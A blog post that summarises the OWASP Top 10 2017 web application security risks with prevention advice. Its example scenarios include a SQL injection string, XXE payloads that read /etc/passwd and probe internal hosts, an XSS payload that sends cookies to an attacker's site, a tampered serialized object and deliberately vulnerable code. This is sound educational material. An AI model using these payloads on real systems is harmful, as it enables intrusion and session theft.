---
title:  "OWASP Top 10 2017 – Application Security Risks"
date:   2018-01-14 13:28:00 +0000
author: dow-j
categories: [information-security]
---

* TOC
{:toc}
{: .markdown-toc}

Open Web Application Security Project (OWASP) is a non-profit orgization dedicated to providing direct, unbiased, and practical information about application security. One of the orgizations most well-known endeavors is the [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) which consists of the top 10 biggest web application security risks identified by OWASP.

<!--more-->

The list is considered a benchmark in AppSec and its primary aim is to educate developers, designers, architects, managers, and organizations about the consequences of the most common and most important web application security weaknesses. The Top 10 provides basic techniques to protect against these high risk problem areas, and provides guidance on where to go from here.

The 2017 OWASP Top 10 list has recently been re-released to the public after the initial version was received with some controversy. The new and revised list is based on over 40 data submissions from firms that specialize in application security and an industry survey that was completed by over 500 individuals. It contains three large-scale vulnerability updates and updated attack scenarios. Let’s take a closer look at the list as a whole and what key changes were made in OWASP Top 10 Application Security Risks 2017.

## A1 - Injection

### Overview

Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent
to an interpreter as part of a command or query. The attacker’s hostile data can trick the
interpreter into executing unintended commands or accessing data without proper authorization.

Injection can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, or denial of access. Injection can sometimes lead to complete host takeover.

### How to Prevent

Preventing injection requires keeping data separate from
commands and queries.

- The preferred option is to use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs). 

<div class="note info">
  <p>Even when parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data, or executes hostile data with EXECUTE IMMEDIATE or exec().</p>
</div>

- Use positive or "whitelist" server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.

- For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter. 

<div class="note info">
  <p>SQL structure such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report-writing software.</p>
</div>

- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.

### Examples

- **Scenario #1:** An application uses untrusted data in the construction of the following vulnerable SQL call:

{% highlight sql %}
String query = "SELECT * FROM accounts WHERE
custID='" + request.getParameter("id") + "'";
{% endhighlight %}

- **Scenario #2:** Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):

{% highlight sql %}
Query HQLQuery = session.createQuery("FROM accounts
WHERE custID='" + request.getParameter("id") + "'");
{% endhighlight %}

In both cases, the attacker modifies the ‘id’ parameter value in
their browser to send: ' or '1'='1. For example:

{% highlight sql %}
http://example.com/app/accountView?id=' or '1'='1
{% endhighlight %}

This changes the meaning of both queries to return all the
records from the accounts table. More dangerous attacks could
modify or delete data, or even invoke stored procedures.

## A2 - Broken Authentication

### Overview

Application functions related to authentication and session management are often implemented
incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit
other implementation flaws to assume other users’ identities temporarily or permanently.

An attacker needs only gain access to a few accounts, or just one admin account to compromise the system. Depending on the domain of the application, this may allow money laundering, social security fraud, and identity theft, or disclose legally protected highly sensitive information.

### How to Prevent

- Where possible, implement multi-factor authentication to prevent automated, credential stuffing, brute force, and stolen credential re-use attacks.

- Do not ship or deploy with any default credentials, particularly for admin users.

- Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.

- Align password length, complexity and rotation policies with NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence based password policies.

- Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.

- Limit or increasingly delay failed login attempts. Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.

- Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session IDs should not be in the URL, be securely stored and invalidated after logout, idle, and absolute timeouts.

### Examples

**Scenario #1:** Credential stuffing, the use of lists of known passwords, is a common attack. If an application does not implement automated threat or credential stuffing protections, the application can be used as a password oracle to determine if the credentials are valid.

**Scenario #2:** Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and use multi-factor authentication.

**Scenario #3:** Application session timeouts aren’t set properly. A user uses a public computer to access an application. Instead of selecting “logout” the user simply closes the browser tab and
walks away. An attacker uses the same browser an hour later, and the user is still authenticated.

## A3 - Sensitive Data Exposure

### Overview

Many web applications and APIs do not properly protect sensitive data, such as financial,
healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit
card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra
protection, such as encryption at rest or in transit, and requires special precautions when
exchanged with the browser.

Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive personal information (PII) data such as health records, credentials, personal data, and credit cards, which often require protection as defined by laws or regulations such as the EU GDPR or local privacy laws.

### How to Prevent

Do the following, at a minimum:

- Classify data processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs.

- Apply controls as per the classification.

- Don’t store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data that is not retained cannot be stolen.

- Make sure to encrypt all sensitive data at rest.

- Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management.

- Encrypt all data in transit with secure protocols such as TLS with perfect forward secrecy (PFS) ciphers, cipher prioritization by the server, and secure parameters. Enforce encryption using directives like HTTP Strict Transport Security (HSTS).

- Disable caching for responses that contain sensitive data.

- Store passwords using strong adaptive and salted hashing functions with a work factor (delay factor), such as Argon2, scrypt, bcrypt, or PBKDF2.

- Verify independently the effectiveness of configuration and settings.

### Examples

**Scenario #1:** An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL
injection flaw to retrieve credit card numbers in clear text.

**Scenario #2:** A site doesn't use or enforce TLS for all pages or supports weak encryption. An attacker monitors network traffic (e.g. at an insecure wireless network), downgrades connections
from HTTPS to HTTP, intercepts requests, and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the
user's private data. Instead of the above they could alter all transported data, e.g. the recipient of a money transfer.

**Scenario #3:** The password database uses unsalted or simple hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.

## A4 - XML External Entities (XXE)

### Overview

Many older or poorly configured XML processors evaluate external entity references within XML
documents. External entities can be used to disclose internal files using the file URI handler,
internal file shares, internal port scanning, remote code execution, and denial of service attacks.

These flaws can be used to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. The business impact depends on the protection needs of all affected application and data.

### How to Prevent

Developer training is essential to identify and mitigate XXE. Besides that, preventing XXE requires:

- Whenever possible, use less complex data formats such as JSON, and avoiding serialization of sensitive data.

- Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system. Use dependency checkers. Update SOAP to SOAP 1.2 or higher.

- Disable XML external entity and DTD processing in all XML parsers in the application, as per the OWASP Cheat Sheet 'XXE Prevention'.

- Implement positive ("whitelisting") server-side input validation, filtering, or sanitization to prevent hostile data within XML documents, headers, or nodes.

- Verify that XML or XSL file upload functionality validates incoming XML using XSD validation or similar.

- SAST tools can help detect XXE in source code, although manual code review is the best alternative in large, complex applications with many integrations. If these controls are not possible, consider using virtual patching, API security gateways, or Web Application Firewalls
(WAFs) to detect, monitor, and block XXE attacks.

### Examples

Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply nested dependencies. The easiest way is to upload a malicious XML file, if accepted:

**Scenario #1:** The attacker attempts to extract data from the
server:

{% highlight xml %}
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
{% endhighlight %}

**Scenario #2:** An attacker probes the server's private network by
changing the above ENTITY line to:

{% highlight xml %}
  <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
  Scenario #3: An attacker attempts a denial-of-service attack by
  including a potentially endless file:
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
{% endhighlight %}

## A5 - Broken Access Control

### Overview

Restrictions on what authenticated users are allowed to do are often not properly enforced.
Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access
other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.

The technical impact is attackers acting as users or administrators, or users using privileged functions, or creating, accessing, updating or deleting every record. The business impact depends on the protection needs of the application and data.

### How to Prevent

Access control is only effective if enforced in trusted server-side
code or server-less API, where the attacker cannot modify the
access control check or metadata.

- With the exception of public resources, deny by default.

- Implement access control mechanisms once and re-use them throughout the application, including minimizing CORS usage.

- Model access controls should enforce record ownership, rather than accepting that the user can create, read, update, or delete any record.

- Unique application business limit requirements should be enforced by domain models.

- Disable web server directory listing and ensure file metadata (e.g. .git) and backup files are not present within web roots.

- Log access control failures, alert admins when appropriate (e.g. repeated failures).

- Rate limit API and controller access to minimize the harm from automated attack tooling.

- JWT tokens should be invalidated on the server after logout. Developers and QA staff should include functional access control unit and integration tests.

### Examples

**Scenario #1:** The application uses unverified data in a SQL call that is accessing account information:

{% highlight c# %}
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
{% endhighlight %}

An attacker simply modifies the `'acct'` parameter in the browser to
send whatever account number they want. If not properly
verified, the attacker can access any user's account.

```
http://example.com/app/accountInfo?acct=notmyacct
```

**Scenario #2:** An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.

```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.

## A6 - Security Misconfiguration

### Overview

Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
HTTP headers, and verbose error messages containing sensitive information. Not only must all
operating systems, frameworks, libraries, and applications be securely configured, but they must
be patched and upgraded in a timely fashion.

Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of the application and data.

### How to Prevent

Secure installation processes should be implemented, including:

- A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. This process should be automated to minimize the effort required to setup a new secure environment.

- A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.

- A task to review and update the configurations appropriate to all security notes, updates and patches as part of the patch management process (see A9:2017-Using Components with Known Vulnerabilities). In particular, review cloud storage permissions (e.g. S3 bucket permissions).

- A segmented application architecture that provides effective, secure separation between components or tenants, with segmentation, containerization, or cloud security groups.

- Sending security directives to clients, e.g. Security Headers.

- An automated process to verify the effectiveness of the configurations and settings in all environments.

### Examples

**Scenario #1:** The application server comes with sample applications that are not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. If one of these applications is the admin console, and default accounts weren’t changed the attacker logs in with default passwords and takes over.

**Scenario #2:** Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a serious access control flaw in the application.

**Scenario #3:** The application server’s configuration allows detailed error messages, e.g. stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.

**Scenario #4:** A cloud service provider has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.

## A7 - Cross-Site Scripting (XSS)

### Overview

XSS flaws occur whenever an application includes untrusted data in a new web page without
proper validation or escaping, or updates an existing web page with user-supplied data using a
browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the
victim’s browser which can hijack user sessions, deface web sites, or redirect the user to
malicious sites.

The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.

### How to Prevent

Preventing XSS requires separation of untrusted data from
active browser content. This can be achieved by:

- Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.

- Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The OWASP
Cheat Sheet 'XSS Prevention' has details on the required data escaping techniques.

- Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS
Prevention'.

- Enabling a Content Security Policy (CSP) is a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).

### Examples

**Scenario 1:** The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

{% highlight js %}
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";
{% endhighlight %}

The attacker modifies the ‘CC’ parameter in the browser to:

{% highlight js %}
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
{% endhighlight %}

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

<div class="note warning">
<p>Attackers can use XSS to defeat any automated CrossSite
Request Forgery ( CSRF) defense the application might
employ</p>
</div>

## A8 - Insecure Deserialization

### Overview

Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.

The impact of deserialization flaws cannot be understated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible. The business impact depends on the protection needs of the application and data.

### How to Prevent

The only safe architectural pattern is not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider one of more of the following:

- Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.

- Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated,
so reliance solely on this is not advisable.

- Isolating and running code that deserializes in low privilege environments when possible.

- Logging deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.

- Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.

- Monitoring deserialization, alerting if a user deserializes constantly.

### Examples

**Scenario #1:** A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the "R00" Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.

**Scenario #2:** A PHP forum uses PHP object serialization to save a "super" cookie, containing the user's user ID, role, password hash, and other state:

{% highlight php %}
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
{% endhighlight %}

An attacker changes the serialized object to give themselves
admin privileges:

{% highlight php %}
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
{% endhighlight %}

## A9 - Using Components with Known Vulnerabilities

### Overview

Components, such as libraries, frameworks, and other software modules, run with the same
privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known
vulnerabilities may undermine application defenses and enable various attacks and impacts.

While some known vulnerabilities lead to only minor impacts, some of the largest breaches to date have relied on exploiting known vulnerabilities in components. Depending on the assets you are protecting, perhaps this risk should be at the top of the list.

### How to Prevent

There should be a patch management process in place to:

- Remove unused dependencies, unnecessary features, components, files, and documentation.

- Continuously inventory the versions of both client-side and server-side components (e.g. frameworks, libraries) and their dependencies using tools like versions, DependencyCheck,
retire.js, etc. Continuously monitor sources like CVE and NVD for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.

- Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component.

- Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor,
detect, or protect against the discovered issue. 

Every organization must ensure that there is an ongoing plan for monitoring, triaging, and applying updates or configuration
changes for the lifetime of the application or portfolio. 

### Examples

**Scenario #1:** Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). Some example exploitable component vulnerabilities discovered are:

- CVE-2017-5638, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.

- While internet of things (IoT) are frequently difficult or impossible to patch, the importance of patching them can be great (e.g. biomedical devices).

There are automated tools to help attackers find unpatched or
misconfigured systems. For example, the Shodan IoT search
engine can help you find devices that still suffer from
the Heartbleed vulnerability that was patched in April 2014.

## A10 - Insufficient Logging and Monitoring

### Overview

Insufficient logging and monitoring, coupled with missing or ineffective integration with incident
response, allows attackers to further attack systems, maintain persistence, pivot to more systems,
and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over
200 days, typically detected by external parties rather than internal processes or monitoring. 

Most successful attacks start with vulnerability probing. Allowing such probes to continue can raise the likelihood of successful exploit to nearly 100%. In 2016, identifying a breach took an average of 191 days – plenty of time for damage to be inflicted.

### How to Prevent

As per the risk of the data stored or processed by the application:

- Ensure all login, access control failures, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts, and held for sufficient time to allow delayed forensic analysis.

- Ensure that logs are generated in a format that can be easily consumed by a centralized log management solutions.

- Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.

- Establish effective monitoring and alerting such that suspicious activities are detected and responded to in a timely fashion.

- Establish or adopt an incident response and recovery plan, such as NIST 800-61 rev 2 or later.

There are commercial and open source application protection frameworks such as OWASP AppSensor, web application firewalls such as ModSecurity with the OWASP ModSecurity Core Rule Set, and log correlation software with custom dashboards and alerting. 

### Examples

**Scenario #1:** An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.

**Scenario #2:** An attacker uses scans for users using a common password. They can take over all accounts using this password. For all other users, this scan leaves only one false login behind. After some days, this may be repeated with a different password.

**Scenario #3:** A major US retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one
responded to this detection. The sandbox had been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.

## Closing

As I close this post out I'll quote the OWASP Top 10 Foreward "As our software
becomes increasingly complex, and connected, the difficulty of achieving application security increases exponentially."

Full credit goes to OWASP for this post as a majority of the content comes directly from the 2017 OWASP Top 10.